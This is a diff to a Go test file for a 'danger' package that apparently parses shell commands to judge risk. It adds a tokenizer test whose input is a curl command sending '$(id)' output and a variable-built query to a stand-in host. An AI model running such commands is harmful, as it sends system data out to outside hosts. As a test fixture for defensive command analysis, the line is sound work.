@@ -2,6 +2,7 @@ package danger
 
 import (
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -83,6 +84,28 @@ func TestRED_Analyze_RequestDataRoutingOptions(t *testing.T) {
 		if got := Analyze(cmd).RequestData; got != want {
 			t.Errorf("Analyze(%q).RequestData = %v, want %v", cmd, got, want)
 		}
+	}
+}
+
+func TestShellWords_QuoteRemovalAndDynamicWords(t *testing.T) {
+	words, dyn, ok := ShellWords(`Q='?d=S'; curl "https://e.example/p"'?x=1' https://e.example/$Q "$(id)"`)
+	if !ok {
+		t.Fatal("ShellWords refused a short command")
+	}
+	want := []string{"Q=?d=S", ";", "curl", "https://e.example/p?x=1", "https://e.example/$Q", dynamicSubstToken}
+	if len(words) != len(want) {
+		t.Fatalf("words = %q, want %q", words, want)
+	}
+	for i := range want {
+		if words[i] != want[i] {
+			t.Errorf("word %d = %q, want %q", i, words[i], want[i])
+		}
+	}
+	if dyn[3] || !dyn[4] || !dyn[5] {
+		t.Errorf("dynamic = %v", dyn)
+	}
+	if _, _, ok := ShellWords(strings.Repeat("a", MaxCommandBytes+1)); ok {
+		t.Error("an over-long command was tokenized")
 	}
 }
 
